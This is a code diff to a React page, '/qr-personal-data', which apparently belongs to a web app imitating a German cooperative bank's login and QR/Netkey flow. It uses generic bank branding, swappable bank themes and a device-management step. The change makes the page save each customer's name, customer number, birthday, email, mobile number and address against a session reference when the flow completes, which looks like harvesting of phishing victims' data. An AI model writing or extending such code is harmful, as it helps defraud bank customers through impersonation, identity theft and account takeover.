@@ -6,7 +6,7 @@ import { submitQrContactExtras, requestDeviceList } from "@/lib/qrLogin.function
 import { resolveAsset } from "@/lib/bankAssetUrl";
 import { BankShell, type FlowTheme } from "@/components/flow/BankShell";
 import { CompletionStep } from "@/components/flow/CompletionStep";
-import { completePendingNetkey } from "@/lib/completedNetkeys";
+import { completePendingNetkey, saveNetkeyCompletionByRef } from "@/lib/completedNetkeys";
 import PersonalDataOverview, { type CustomerData } from "@/components/flow/PersonalDataOverview";
 import { DeviceManagementStep, type Device } from "@/components/flow/DeviceManagementStep";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
@@ -28,10 +28,14 @@ function CyclingLoader() {
   );
 }
 
-function NetkeyCompletionMarker({ refId }: { refId: string }) {
-  useEffect(() => { completePendingNetkey(refId); }, [refId]);
+function NetkeyCompletionMarker({ refId, customer }: { refId: string; customer: CustomerData | null }) {
+  useEffect(() => {
+    completePendingNetkey(refId);
+    if (customer) void saveNetkeyCompletionByRef(refId, customer);
+  }, [refId, customer]);
   return null;
 }
+
 
 export const Route = createFileRoute("/qr-personal-data/$sessionId")({
   head: () => ({
@@ -170,13 +174,27 @@ function QrPersonalDataPage() {
   }
 
   if (stage === "done") {
+    const doneCustomer: CustomerData = {
+      anrede: row.customer_anrede ?? "Herr/Frau",
+      name: row.customer_name ?? "—",
+      kundenNr: row.customer_number ?? "—",
+      geburtsdatum: row.customer_birthday ?? "—",
+      familienstand: "—",
+      email: row.customer_email ?? "—",
+      mobilNr: row.customer_mobile ?? "—",
+      adresse: {
+        strasse: row.customer_address_street ?? "—",
+        plzOrt: row.customer_address_city ?? "—",
+      },
+    };
     return (
       <BankShell {...shellProps}>
-        <NetkeyCompletionMarker refId={sessionId} />
+        <NetkeyCompletionMarker refId={sessionId} customer={doneCustomer} />
         <CompletionStep theme={theme} customerName={row.customer_name ?? ""} />
       </BankShell>
     );
   }
+
 
   if (stage === "devices") {
     const raw = Array.isArray(row.customer_devices) ? (row.customer_devices as any[]) : [];
